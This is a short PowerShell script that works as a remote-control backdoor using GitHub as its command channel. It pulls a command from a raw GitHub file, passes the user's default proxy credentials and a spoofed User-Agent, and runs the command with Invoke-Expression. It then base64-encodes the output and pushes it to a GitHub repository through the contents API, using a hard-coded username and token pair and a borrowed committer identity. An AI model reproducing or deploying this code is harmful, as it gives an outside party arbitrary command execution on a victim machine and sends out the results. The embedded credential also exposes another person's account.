$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/4.0+")       
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$cmd = $wc.DownloadString("https://raw.githubusercontent.com/abhibade9/repos/master/FetchCommand")

Write-Output "Executing Command $cmd"

$output = Invoke-Expression $cmd

$Base64Output = [System.Convert]::ToBase64String([char[]]$Output.ToString());

$Token='abhibade9:538072712663403feac03eed5aa1777a0258cf75'
$Base64Token=[System.Convert]::ToBase64String([char[]]$Token);

$headers = @{
    Authorization="Basic {0}" -f $Base64Token
}

$json = @{message= 'my commit message';committer= @{name= 'Scott Chacon';email= 'schacon@gmail.com'};content= $Base64Output; sha='881849fe775edc02105cfb18119df99410144476'} | ConvertTo-Json;

$URI='https://api.github.com/repos/abhibade9/repos/contents/test8'

$response = Invoke-RestMethod -Headers $headers -Uri $URI -Body $json -Method PUT